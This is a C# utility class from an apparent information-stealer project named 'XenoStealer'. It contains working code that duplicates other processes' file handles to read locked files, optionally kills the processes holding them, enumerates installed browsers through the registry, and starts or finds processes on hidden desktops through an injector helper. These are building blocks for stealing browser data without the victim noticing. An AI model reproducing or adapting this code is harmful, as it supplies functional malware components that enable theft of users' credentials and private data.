using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using static XenoStealer.InternalStructs;

namespace XenoStealer
{
    public static class Utils
    {
        private static uint PROCESS_QUERY_INFORMATION = 0x0400;
        private static uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;

        private static int TokenElevation = 20;

        private static uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        private static uint TOKEN_DUPLICATE = 0x0002;
        private static uint TOKEN_QUERY = 0x0008;
        private static uint TOKEN_ADJUST_DEFAULT = 0x0080;
        private static uint TOKEN_ADJUST_SESSIONID = 0x0100;


        private static uint CREATE_NEW_CONSOLE = 0x00000010;
        private static uint NORMAL_PRIORITY_CLASS = 0x00000020;

        private static readonly Random _random = new Random();

        public static string GenerateRandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            StringBuilder result = new StringBuilder(length);

            for (int i = 0; i < length; i++)
            {
                result.Append(chars[_random.Next(chars.Length)]);
            }

            return result.ToString();
        }

        public static bool IsAdmin()
        {
            bool isElevated;
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            return isElevated;
        }

        public static bool IsProcessAdmin(int pid, out bool IsAdmin)
        {
            IsAdmin = false;
            IntPtr ProcessHandle = NativeMethods.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, (uint)pid);
            if (ProcessHandle == IntPtr.Zero)
            {
                return false;
            }
            bool result = IsProcessAdmin(ProcessHandle, out IsAdmin);
            NativeMethods.CloseHandle(ProcessHandle);
            return result;
        }

        public static bool IsProcessAdmin(IntPtr ProcessHandle, out bool IsAdmin)
        {
            IsAdmin = false;
            if (!NativeMethods.OpenProcessToken(ProcessHandle, TOKEN_QUERY, out IntPtr tokenHandle))
            {
                return false;
            }
            int elevationSize = Marshal.SizeOf(typeof(InternalStructs.TOKEN_ELEVATION));
            IntPtr elevationPtr = Marshal.AllocHGlobal(elevationSize);
            if (NativeMethods.GetTokenInformation(tokenHandle, TokenElevation, elevationPtr, elevationSize, out int returnLength) && returnLength == elevationSize)
            {
                InternalStructs.TOKEN_ELEVATION elevationStruct = Marshal.PtrToStructure<InternalStructs.TOKEN_ELEVATION>(elevationPtr);
                Marshal.FreeHGlobal(elevationPtr);
                NativeMethods.CloseHandle(tokenHandle);
                IsAdmin = elevationStruct.TokenIsElevated != 0;
                return true;
            }
            Marshal.FreeHGlobal(elevationPtr);
            NativeMethods.CloseHandle(tokenHandle);
            return false;
        }

        private static RegistryView[] registryViews = new RegistryView[] { RegistryView.Registry64, RegistryView.Registry32 };

        public static bool ForceCopy(string target, string destination) 
        {
            byte[] fileData = ForceReadFile(target);
            if (fileData == null) 
            {
                return false;
            }
            try 
            {
                File.WriteAllBytes(destination, fileData);
            } 
            catch 
            {
                return false;
            }
            return true;

        }

        public static string ForceReadFileString(string filePath, bool killOwningProcessIfCouldntAquire = false)
        {
            byte[] fileContent = ForceReadFile(filePath, killOwningProcessIfCouldntAquire);
            if (fileContent == null) 
            {
                return null;
            }
            try 
            {
                return Encoding.UTF8.GetString(fileContent);
            } 
            catch 
            { 
            }
            return null;
        }

        public static byte[] ForceReadFile(string filePath, bool killOwningProcessIfCouldntAquire=false)
        {
            try 
            { 
                return File.ReadAllBytes(filePath);
            } 
            catch (Exception e)
            {
                if (e.HResult != -2147024864) //this is the error for if the file is being used by another process
                {
                    return null;
                }
            }

            bool Pidless = false;

            if (!GetProcessLockingFile(filePath, out int[] process)) 
            {
                Pidless = true;
            }

            uint dwSize = 0;
            uint status = 0;
            uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;


            int HandleStructSize = Marshal.SizeOf(typeof(InternalStructs.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));

            IntPtr pInfo = Marshal.AllocHGlobal(HandleStructSize);
            do
            {
                status = NativeMethods.NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS.SystemExtendedHandleInformation, pInfo, dwSize, out dwSize);
                if (status == STATUS_INFO_LENGTH_MISMATCH)
                {
                    pInfo = Marshal.ReAllocHGlobal(pInfo, (IntPtr)dwSize);
                }
            } while (status != 0);


            //ULONG_PTR NumberOfHandles;
            //ULONG_PTR Reserved;
            //SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];

            IntPtr pInfoBackup = pInfo;

            ulong NumOfHandles =(ulong)Marshal.ReadIntPtr(pInfo);

            pInfo += 2 * IntPtr.Size;//skip past the number of handles and the reserved and start at the handles.

            byte[] result = null;

            for (ulong i = 0; i < NumOfHandles; i++) 
            {
                InternalStructs.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX HandleInfo = Marshal.PtrToStructure<InternalStructs.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX>(pInfo+(int)(i * (uint)HandleStructSize));

                if (!Pidless && !process.Contains((int)(uint)HandleInfo.UniqueProcessId)) 
                {
                    continue;
                }


                if (DupHandle((int)HandleInfo.UniqueProcessId, (IntPtr)(ulong)HandleInfo.HandleValue, out IntPtr duppedHandle)) 
                {
                    if (NativeMethods.GetFileType(duppedHandle) != FileType.FILE_TYPE_DISK) 
                    {
                        NativeMethods.CloseHandle(duppedHandle);
                        continue;
                    }

                    string name=GetPathFromHandle(duppedHandle);

                    if (name == null) 
                    {
                        NativeMethods.CloseHandle(duppedHandle);
                        continue;
                    }

                    if (name.StartsWith("\\\\?\\")) 
                    {
                        name=name.Substring(4);
                    }

                    if (name == filePath) 
                    {
                        result = ReadFileBytesFromHandle(duppedHandle);
                        NativeMethods.CloseHandle(duppedHandle);
                        if (result != null) 
                        {
                            break;
                        }
                    }

                    NativeMethods.CloseHandle(duppedHandle);

                }

                
            }
            Marshal.FreeHGlobal(pInfoBackup);

            if (result == null && killOwningProcessIfCouldntAquire) 
            {
                foreach (int i in process) 
                {
                    KillProcess(i);
                }

                try
                {
                    result=File.ReadAllBytes(filePath);
                }
                catch 
                { 
                }

            }

            return result;
        }

        public static string GetPathFromHandle(IntPtr file)
        {
            uint FILE_NAME_NORMALIZED = 0x0;

            StringBuilder FileNameBuilder = new StringBuilder(32767 + 2);//+2 for a possible null byte?
            uint pathLen = NativeMethods.GetFinalPathNameByHandleW(file, FileNameBuilder, (uint)FileNameBuilder.Capacity, FILE_NAME_NORMALIZED);
            if (pathLen == 0)
            {
                return null;
            }
            string FileName = FileNameBuilder.ToString(0, (int)pathLen);
            return FileName;
        }

        public static bool DupHandle(int sourceProc, IntPtr sourceHandle, out IntPtr newHandle)
        {
            newHandle = IntPtr.Zero;
            uint PROCESS_DUP_HANDLE = 0x0040;
            uint DUPLICATE_SAME_ACCESS = 0x00000002;
            IntPtr procHandle = NativeMethods.OpenProcess(PROCESS_DUP_HANDLE, false, (uint)sourceProc);
            if (procHandle == IntPtr.Zero)
            {
                return false;
            }

            IntPtr targetHandle = IntPtr.Zero;

            if (!NativeMethods.DuplicateHandle(procHandle, sourceHandle, NativeMethods.GetCurrentProcess(), ref targetHandle, 0, false, DUPLICATE_SAME_ACCESS))
            {
                NativeMethods.CloseHandle(procHandle);
                return false;

            }
            newHandle = targetHandle;
            NativeMethods.CloseHandle(procHandle);
            return true;
        }

        public static bool GetProcessLockingFile(string filePath, out int[] process) 
        {
            process = null;
            uint ERROR_MORE_DATA = 0xEA;

            string key = Guid.NewGuid().ToString();
            if (NativeMethods.RmStartSession(out uint SessionHandle, 0, key) != 0) 
            {
                return false;
            }

            string[] resourcesToCheckAgaist = new string[] { filePath };
            if (NativeMethods.RmRegisterResources(SessionHandle, (uint)resourcesToCheckAgaist.Length, resourcesToCheckAgaist, 0, null, 0, null) != 0) 
            { 
                NativeMethods.RmEndSession(SessionHandle);
                return false;
            }

            

            while (true) 
            {
                uint nProcInfo = 0;
                uint status=NativeMethods.RmGetList(SessionHandle, out uint nProcInfoNeeded, ref nProcInfo, null, out RM_REBOOT_REASON RebootReasions);
                if (status != ERROR_MORE_DATA) 
                {
                    NativeMethods.RmEndSession(SessionHandle);
                    process = new int[0];
                    return true;
                }
                uint oldnProcInfoNeeded = nProcInfoNeeded;
                RM_PROCESS_INFO[] AffectedApps = new RM_PROCESS_INFO[nProcInfoNeeded];
                nProcInfo = nProcInfoNeeded;
                status = NativeMethods.RmGetList(SessionHandle, out nProcInfoNeeded, ref nProcInfo, AffectedApps, out RebootReasions);
                if (status == 0) 
                {
                    process = new int[AffectedApps.Length];
                    for (int i = 0;i<AffectedApps.Length;i++) 
                    {
                        process[i] = (int)AffectedApps[i].Process.dwProcessId;
                    }
                    break;
                }
                if (oldnProcInfoNeeded != nProcInfoNeeded)
                {
                    continue;
                }
                else 
                {
                    NativeMethods.RmEndSession(SessionHandle);
                    return false;
                }
            }
            NativeMethods.RmEndSession(SessionHandle);
            return true;
        }

        public static byte[] ReadFileBytesFromHandle(IntPtr handle) 
        {
            uint PAGE_READONLY = 0x02;
            uint FILE_MAP_READ = 0x04;
            IntPtr fileMapping = NativeMethods.CreateFileMappingA(handle, IntPtr.Zero, PAGE_READONLY, 0, 0, null);
            if (fileMapping == IntPtr.Zero) 
            {
                return null;
            }

            if (!NativeMethods.GetFileSizeEx(handle, out ulong fileSize)) 
            {
                NativeMethods.CloseHandle(fileMapping);
                return null;
            }

            IntPtr BaseAddress = NativeMethods.MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, (UIntPtr)fileSize);
            if (BaseAddress == IntPtr.Zero) 
            {
                NativeMethods.CloseHandle(fileMapping);
                return null;
            }

            byte[] FileData = new byte[fileSize];

            Marshal.Copy(BaseAddress, FileData, 0, (int)fileSize);

            NativeMethods.UnmapViewOfFile(BaseAddress);
            NativeMethods.CloseHandle(fileMapping);

            return FileData;
        }

        public static bool KillProcess(int pid, uint exitcode=0) 
        {
            uint PROCESS_TERMINATE = 0x0001;
            IntPtr ProcessHandle=NativeMethods.OpenProcess(PROCESS_TERMINATE, false, (uint)pid);
            if (ProcessHandle == IntPtr.Zero) 
            {  
                return false; 
            }

            bool result = NativeMethods.TerminateProcess(ProcessHandle, exitcode);
            NativeMethods.CloseHandle(ProcessHandle);
            return result;
        }

        public static bool CompareByteArrays(byte[] b1, byte[] b2) 
        {
            if (b1 == null || b2 == null) 
            {
                return b1 == b2;
            }
            if (b1.Length != b2.Length) 
            {
                return false;
            }
            return NativeMethods.memcmp(b1, b2, (UIntPtr)b1.Length) == 0;
        }

        public static string ReverseString(string str)
        {
            char[] charArray = str.ToCharArray();
            Array.Reverse(charArray);
            return new string(charArray);
        }

        public static object ReadRegistryKeyValue(RegistryHive hive, string location, string value)
        {
            foreach (RegistryView view in registryViews) 
            {
                if (view == RegistryView.Registry64 && !Environment.Is64BitOperatingSystem) 
                {
                    continue;
                }
                RegistryKey hiveKey = null;
                RegistryKey keyData = null;
                try
                {
                    hiveKey = RegistryKey.OpenBaseKey(hive, view);
                    if (hiveKey == null)
                    {
                        continue;
                    }
                    keyData = hiveKey.OpenSubKey(location);
                    if (keyData == null)
                    {
                        hiveKey.Dispose();
                        continue;
                    }
                    object data = keyData.GetValue(value);
                    if (data == null)
                    {
                        hiveKey.Dispose();
                        keyData.Dispose();
                        continue;
                    }
                    return data;
                }
                catch 
                {
                    
                }
                finally
                {
                    hiveKey?.Dispose();
                    keyData?.Dispose();
                }
            }
            return null;
        }

        public static byte[] ConvertHexStringToByteArray(string hexString)
        {
            if (hexString.Length % 2 != 0)
            {
                return null;
            }

            byte[] data = new byte[hexString.Length / 2];
            for (int index = 0; index < data.Length; index++)
            {
                string byteValue = hexString.Substring(index * 2, 2);//*2 as its 2 chars per byte
                data[index] = byte.Parse(byteValue, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
            }

            return data;
        }

        public static string[] GetInstalledBrowsers()
        {
            HashSet<string> browserPaths = new HashSet<string>();

            string[] registryKeys = new string[]
            {
                @"SOFTWARE\Clients\StartMenuInternet",
                @"SOFTWARE\WOW6432Node\Clients\StartMenuInternet"
            };

            RegistryKey[] rootKeys = new RegistryKey[]
            {
                Registry.LocalMachine,
                Registry.CurrentUser
            };

            foreach (RegistryKey rootKey in rootKeys)
            {
                foreach (string registryKey in registryKeys)
                {
                    try
                    {
                        using (RegistryKey key = rootKey.OpenSubKey(registryKey))
                        {
                            if (key != null)
                            {
                                foreach (string subKeyName in key.GetSubKeyNames())
                                {
                                    try
                                    {
                                        using (RegistryKey browserKey = key.OpenSubKey(subKeyName))
                                        {
                                            using (RegistryKey commandKey = browserKey?.OpenSubKey(@"shell\open\command"))
                                            {
                                                if (commandKey != null)
                                                {
                                                    string browserPath = commandKey.GetValue(null) as string;

                                                    if (!string.IsNullOrEmpty(browserPath) && !browserPath.Contains("iexplore.exe"))
                                                    {
                                                        browserPath = browserPath.Trim('"');
                                                        browserPaths.Add(browserPath);
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    catch
                                    {
                                    }
                                }
                            }
                        }
                    }
                    catch
                    {
                    }
                }
            }

            return browserPaths.ToArray();
        }

        private static int LevenshteinDistance(string s1, string s2)
        {
            int[,] d = new int[s1.Length + 1, s2.Length + 1];

            for (int i = 0; i <= s1.Length; i++)
                d[i, 0] = i;

            for (int j = 0; j <= s2.Length; j++)
                d[0, j] = j;

            for (int i = 1; i <= s1.Length; i++)
            {
                for (int j = 1; j <= s2.Length; j++)
                {
                    int cost = (s1[i - 1] == s2[j - 1]) ? 0 : 1;

                    d[i, j] = Math.Min(Math.Min(d[i - 1, j] + 1, d[i, j - 1] + 1), d[i - 1, j - 1] + cost);
                }
            }

            return d[s1.Length, s2.Length];
        }

        public static double CalculateStringSimilarity(string s1, string s2)
        {
            int maxLength = Math.Max(s1.Length, s2.Length);
            if (maxLength == 0) return 1.0;

            int distance = LevenshteinDistance(s1, s2);
            return (1.0 - (double)distance / maxLength) * 100;
        }

        public static bool IsProcess64Bit(IntPtr handle)
        {
            bool result;
            try
            {
                NativeMethods.IsWow64Process(handle, out result);
            }
            catch
            {
                return Environment.Is64BitOperatingSystem;
            }
            return !result;
        }

        public static byte[] GetCurrentSelfBytes()
        {
            Assembly assembly = Assembly.GetExecutingAssembly();
            MethodInfo GetRawAssemblyBytes = assembly.GetType().GetMethod("GetRawBytes", BindingFlags.Instance | BindingFlags.NonPublic);
            byte[] assemblyBytes = (byte[])GetRawAssemblyBytes.Invoke(assembly, null);
            return assemblyBytes;
        }

        public static string GetProcessDesktopName(IntPtr hProcess) 
        {
            if (IsProcess64Bit(hProcess))
            {
                return Utils64.GetProcessDesktopName64(hProcess);
            }
            else 
            {
                return Utils32.GetProcessDesktopName32(hProcess);
            }
        }

        public static bool StartProcessInDesktop(string DesktopName, string Application, out int ProcessId)
        {
            StringBuilder commandLine = new StringBuilder();
            commandLine.Append(Application);

            STARTUPINFOW startupInfo = new STARTUPINFOW();
            startupInfo.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFOW));
            startupInfo.lpDesktop = DesktopName;

            IntPtr lpStartupInfo = Marshal.AllocHGlobal((int)startupInfo.cb);
            Marshal.StructureToPtr(startupInfo, lpStartupInfo, false);

            bool result = NativeMethods.CreateProcessW(null, commandLine, IntPtr.Zero, IntPtr.Zero, false, CREATE_NEW_CONSOLE | NORMAL_PRIORITY_CLASS, IntPtr.Zero, null, lpStartupInfo, out PROCESS_INFORMATION procInfo);

            Marshal.FreeHGlobal(lpStartupInfo);

            ProcessId = (int)procInfo.dwProcessId;

            return result;
        }


        public static string GetTemporaryDirectory()
        {
            string tempDirectory = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());

            if (File.Exists(tempDirectory))
            {
                return GetTemporaryDirectory();
            }
            else
            {
                Directory.CreateDirectory(tempDirectory);
                return tempDirectory;
            }
        }

        public static int[] GetAllProcessOnDesktop(string deskopName) 
        {
            List<int> procs = new List<int>();
            foreach (Process p in Process.GetProcesses()) 
            {
                int pid = p.Id;
                IntPtr handle=SharpInjector.GetProcessHandleWithRequiredRights(pid);
                p.Close();
                if (handle != IntPtr.Zero) 
                {
                    string desktop = GetProcessDesktopName(handle);
                    if (desktop!=null && desktop.ToLower() == deskopName.ToLower()) 
                    { 
                        procs.Add(pid);
                    }
                    NativeMethods.CloseHandle(handle);
                }
            }
            return procs.ToArray();
        }

    }
}
